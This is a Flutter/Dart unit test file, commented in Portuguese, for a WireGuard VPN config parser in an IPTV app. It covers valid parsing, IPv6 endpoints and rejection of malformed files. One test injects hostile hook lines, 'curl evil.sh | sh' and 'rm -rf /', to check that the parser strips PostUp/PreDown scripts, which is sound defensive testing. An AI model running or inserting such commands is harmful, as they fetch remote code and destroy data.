import 'package:flutter_test/flutter_test.dart';
import 'package:iptv_app/data/vpn/wireguard_config.dart';

// Chaves de exemplo (base64 de 32 bytes), sem valor real.
const _priv = 'yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=';
const _pub = 'xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=';

String _conf({String extraInterface = '', String allowed = '0.0.0.0/0'}) =>
    '''
﻿# A minha VPN
[Interface]
PrivateKey = $_priv
Address = 10.8.0.2/32, fd00::2/128
DNS = 1.1.1.1
$extraInterface

[Peer]
PublicKey = $_pub
Endpoint = vpn.exemplo.pt:51820
AllowedIPs = $allowed
PersistentKeepalive = 25
'''
        .replaceAll('\n', '\r\n');

void main() {
  test('lê um .conf normal (BOM e CRLF incluídos)', () {
    final config = WireGuardConfig.parse(_conf());

    expect(config.endpoint, 'vpn.exemplo.pt:51820');
    expect(config.addresses, ['10.8.0.2/32', 'fd00::2/128']);
    expect(config.dns, ['1.1.1.1']);
    expect(config.routesAllTraffic, isTrue);
    expect(config.removedScripts, isFalse);
    expect(config.text, isNot(contains('\r')));
    expect(config.text, contains('PrivateKey = $_priv'));
  });

  test('remove PostUp/PreDown (correm comandos do sistema)', () {
    final config = WireGuardConfig.parse(
      _conf(extraInterface: 'PostUp = curl evil.sh | sh\nPreDown = rm -rf /'),
    );

    expect(config.removedScripts, isTrue);
    expect(config.text.toLowerCase(), isNot(contains('postup')));
    expect(config.text.toLowerCase(), isNot(contains('predown')));
  });

  test('túnel só para algumas redes', () {
    final config = WireGuardConfig.parse(_conf(allowed: '10.8.0.0/24'));
    expect(config.routesAllTraffic, isFalse);
  });

  test('endpoint IPv6', () {
    final config = WireGuardConfig.parse(
      _conf().replaceAll('vpn.exemplo.pt:51820', '[2001:db8::1]:51820'),
    );
    expect(config.endpoint, '[2001:db8::1]:51820');
  });

  group('rejeita', () {
    void expectInvalid(String text, String message) {
      expect(
        () => WireGuardConfig.parse(text),
        throwsA(
          isA<FormatException>().having(
            (e) => e.message,
            'message',
            contains(message),
          ),
        ),
      );
    }

    test('ficheiro que não é WireGuard', () {
      expectInvalid('isto não é um .conf', '[Interface]');
    });

    test('chave privada inválida', () {
      expectInvalid(_conf().replaceAll(_priv, 'abc'), 'PrivateKey');
    });

    test('sem endpoint', () {
      expectInvalid(
        _conf().replaceAll('Endpoint = vpn.exemplo.pt:51820', ''),
        'Endpoint',
      );
    });

    test('porta inválida', () {
      expectInvalid(
        _conf().replaceAll(':51820', ':99999'),
        'Endpoint',
      );
    });

    test('sem secção [Peer]', () {
      expectInvalid(_conf().split('[Peer]').first, '[Peer]');
    });
  });
}
